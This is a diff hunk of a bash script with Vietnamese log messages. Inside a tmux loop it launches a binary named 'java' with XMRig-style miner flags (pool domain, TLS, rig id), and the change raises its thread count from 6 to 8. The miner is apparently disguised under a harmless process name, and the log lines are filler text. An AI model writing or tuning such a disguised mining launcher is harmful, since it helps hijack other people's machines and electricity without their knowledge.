@@ -38,7 +38,7 @@ while true; do
         echo "[+] start process start process start process start process start process start process - chạy 3 phút..."
         tmux new-session -s $SESSION -d
         tmux send-keys -t $SESSION "
-            $(pwd)/java/java -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
+            $(pwd)/java/java -o $DOMAIN --tls -k -t 8 --rig-id $NAME_WORK
         " C-m
     else
         echo "[+] start process start process start process start process start process start process - chạy 3 phút check lai..."
